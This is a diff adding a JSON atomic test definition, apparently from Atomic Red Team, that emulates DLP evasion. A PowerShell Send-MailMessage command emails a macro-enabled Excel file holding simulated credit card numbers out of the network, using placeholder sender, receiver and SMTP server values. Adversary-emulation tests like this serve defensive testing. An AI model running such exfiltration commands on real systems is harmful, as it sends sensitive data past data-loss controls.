@@ -1,0 +1,44 @@
+{
+    "name": "DLP Evasion via Sensitive Data in VBA Macro over email",
+    "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email. Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1027",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Obfuscated Files or Information",
+    "source": "ART",
+    "uuid": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad",
+    "arguments": {
+        "input_file": {
+            "description": "Path of the XLSM file",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"
+        },
+        "sender": {
+            "description": "sender email",
+            "type": "string",
+            "default": "test@corp.com"
+        },
+        "receiver": {
+            "description": "receiver email",
+            "type": "string",
+            "default": "test@corp.com"
+        },
+        "smtp_server": {
+            "description": "SMTP Server IP Address",
+            "type": "string",
+            "default": "127.0.0.1"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
